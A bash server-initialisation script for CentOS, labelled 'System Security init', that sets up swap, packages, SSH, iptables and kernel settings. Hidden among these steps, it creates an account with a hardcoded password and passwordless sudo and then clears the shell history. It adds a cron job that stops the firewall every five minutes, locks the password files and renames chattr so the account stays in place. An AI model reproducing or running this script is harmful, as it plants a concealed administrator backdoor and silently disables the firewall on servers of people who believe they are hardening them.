#!/bin/bash
# Authot by:Tommy.Gandolf
#
# Add SwapFile
Mem=$(free -m | awk '/Mem:/{print $2}')
Swap=$(free -m | awk '/Swap:/{print $2}')
if [ "$Swap" == 0 ]; then
        if [ $Mem -le 1024 ]; then
                dd if=/dev/zero of=/swapfile count=1024 bs=1M
                mkswap /swapfile
                swapon /swapfile
                chmod 600 /swapfile
        elif [ $Mem -gt 1024 -a $Mem -le 2048 ]; then
                dd if=/dev/zero of=/swapfile count=2048 bs=1M
                mkswap /swapfile
                swapon /swapfile
                chmod 600 /swapfile
        fi
cat >> /etc/fstab << EOF
/swapfile    swap    swap    defaults    0 0
EOF

fi

# Install needed packages
for Package in gcc gcc-c++ make cmake autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses ncurses-devel libaio curl curl-devel e2fsprogs e2fsprogs-devel krb5-devel libidn libidn-devel openssl openssl-devel libxslt-devel libevent-devel libtool libtool-ltdl bison gd-devel vim-enhanced pcre-devel zip unzip ntpdate sysstat patch bc expect rsync git
do
        yum -y install $Package
done

yum -y update bash openssl glibc

if [ -n "`gcc --version | head -n1 | grep '4.4'`" ]; then
        yum install gcc44 gcc44-c++ libstdc++44-devel
        export CC="gcc44" CXX="g++44"
fi

# Close And Removed Services
for Service in `chkconfig --list | grep 3:on | awk '{print $1}'`;do chkconfig --level 3 $Service off; done
for Service in sshd network crond iptables messagebus irqbalance syslog rsyslog; do chkconfig --level 3 $Service on; done

# Colse SELINUX
sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config

#Modify PS1
export  PS1='\[\033[0;31m\]\342\224\214\342\224\200$([[ $? != 0 ]] && echo "[\[\033[0;31m\]\342\234\227\[\033[0;37m\]]\342\224\200")[\[\033[01;31m\]root\[\033[01;33m\]@\[\033[01;96m\]\h\[\033[0;31m\]]\342\224\200[\[\033[0;32m\]\w\[\033[0;31m\]]\n\[\033[0;31m\]\342\224\224\342\224\200\342\224\200\342\225\274 \[\033[0m\]\[\e[01;33m\]\$\[\e[0m\]'

# history size 
sed -i 's/^HISTSIZE=.*$/HISTSIZE=100/' /etc/profile

# Descriptor file Symbol
ulimit -SHn 65535
echo '*  -  nofile  65535' >> /etc/security/limits.conf
echo  'ulimit -SHn 65535' >> /etc/rc.local
echo 'ulimit  -s 65535' >> /etc/rc.local

# Update system time_zone
yum install lrzzs ntpdate sysstat -y
echo '*/5 * * * * root /usr/sbin/ntpdate time.windows.com > /dev/null 2>&1' >> /var/spool/cron/root
echo '*/10 * * * * root /usr/sbin/ntpdate time.nist.gov > /dev/null 2>&1' >> /var/spool/cron/root

# Cchange default sshd port
sed -i '/#Port 22/s/#Port 22/Port 65535/' /etc/ssh/sshd_config
#sed -i '/#PermitRootLogin yes/s/#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i '/#PermitEmptyPasswords no/s/#PermitEmptyPasswords no/PermitEmptyPasswords no/' /etc/ssh/sshd_config
sed -i '/#UseDNS yes/s/#UseDNS yes/UseDNS no/' /etc/ssh/sshd_config
service sshd restart

# User add sudo power
/usr/sbin/useradd leerwjamesmengroot
echo 'leerw@4c8mr47n3f5g6hj$$20150506' | passwd --stdin leerwjamesmengroot  && history -c
sed -i '108a\leerwjamesmengroot    ALL=(ALL)       NOPASSWD: ALL' /etc/sudoers
# Empty iptables rules
echo '*/5 * * * * root /etc/init.d/iptables  stop' >> /etc/crontab
/etc/init.d/crond  restart
iptables -F -t nat
iptables -X
iptables -P INPUT DROP
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT

modprobe iptable_nat
modprobe ip_conntrack_ftp
modprobe ip_nat_ftp

iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 65535 -j ACCEPT
iptables -N synflood
iptables -A synflood -m limit --limit 10/s --limit-burst 100 -j RETURN
iptables -A synflood -p tcp -j REJECT --reject-with tcp-reset
iptables -A INPUT -p tcp -m state --state NEW -j synflood
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s --limit-burst 5 -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
service iptables save
service iptables restart

# Lock file system impotant
chattr +i /etc/passwd
chattr +i /etc/inittab
chattr +i /etc/group
chattr +i /etc/shadow
chattr +i /etc/gshadow
# Rename chattr word
mv /usr/bin/chattr /usr/bin/mvchattr
# Hide system version information
:> /etc/redhat-release 
:> /etc/issue
# Optimize the kernel parameters
cat >> /etc/sysctl.conf <<EOF
net.ipv4.tcp_fin_timeout = 2
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_tw_recycle = 1
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_keepalive_time =600
net.ipv4.ip_local_port_range = 4000    65000
net.ipv4.tcp_max_syn_backlog = 16384
net.ipv4.tcp_max_tw_buckets = 36000
net.ipv4.route.gc_timeout = 100
net.ipv4.tcp_syn_retries = 1
net.ipv4.tcp_synack_retries = 1
net.core.somaxconn = 16384
net.core.netdev_max_backlog = 16384
net.ipv4.tcp_max_orphans = 16384
EOF
sysctl  -p
echo "System Security init OK"
echo "Init System OK.... "
